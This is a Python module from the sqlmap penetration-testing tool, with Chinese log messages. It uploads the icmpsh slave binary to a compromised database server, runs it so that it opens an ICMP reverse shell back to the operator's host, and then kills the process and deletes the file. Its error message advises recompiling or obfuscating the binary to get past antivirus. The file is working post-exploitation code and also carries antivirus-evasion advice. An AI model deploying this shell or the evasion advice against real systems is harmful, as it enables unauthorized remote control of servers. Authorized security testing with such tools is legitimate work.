#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os
import re
import socket
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.exception import SqlmapDataException

class ICMPsh(object):
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP() or conf.hostname
        self._icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe_"))

    def _selectRhost(self):
        address = None
        message = "后端 DBMS 的地址是什么？"

        if self.remoteIP:
            message += "[按回车键使用默认值 '%s'(检测到的值)] " % self.remoteIP

        while not address:
            address = readInput(message, default=self.remoteIP)

            if conf.batch and not address:
                raise SqlmapDataException("remote host address is missing")

        return address

    def _selectLhost(self):
        address = None
        message = "本地地址是什么？"

        if self.localIP:
            message += "[按回车键使用默认值 '%s'(检测到的值)] " % self.localIP

        valid = None
        while not valid:
            valid = True
            address = readInput(message, default=self.localIP or "")

            try:
                socket.inet_aton(address)
            except socket.error:
                valid = False
            finally:
                valid = valid and re.search(r"\d+\.\d+\.\d+\.\d+", address) is not None

            if conf.batch and not address:
                raise SqlmapDataException("local host address is missing")
            elif address and not valid:
                warnMsg = "无效的本地主机地址"
                logger.warning(warnMsg)

        return address

    def _prepareIngredients(self, encode=True):
        self.localIP = getattr(self, "localIP", None)
        self.remoteIP = getattr(self, "remoteIP", None)
        self.lhostStr = ICMPsh._selectLhost(self)
        self.rhostStr = ICMPsh._selectRhost(self)

    def _runIcmpshMaster(self):
        infoMsg = "在本地运行icmpsh主控端"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = "在远程运行icmpsh从属端"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        ICMPsh._initVars(self)
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)
        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("正在将 icmpsh 从属程序上传到 '%s'" % self._icmpslaveRemote)

        if web:
            written = self.webUpload(self._icmpslaveRemote, os.path.split(self._icmpslaveRemote)[0], filepath=self._icmpslave)
        else:
            written = self.writeFile(self._icmpslave, self._icmpslaveRemote, "binary", forceCheck=True)

        if written is not True:
            errMsg = "上传icmpsh时出现问题,似乎二进制文件未写入数据库底层文件系统,或者被防病毒软件标记为恶意并删除。在这种情况下,建议对icmpsh进行轻微修改后重新编译源代码,或者使用混淆软件进行打包。"
            logger.error(errMsg)

            return False
        else:
            logger.info("icmpsh 上传成功")
            return True

    def icmpPwn(self):
        ICMPsh._prepareIngredients(self)
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = "icmpsh主控端已退出"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
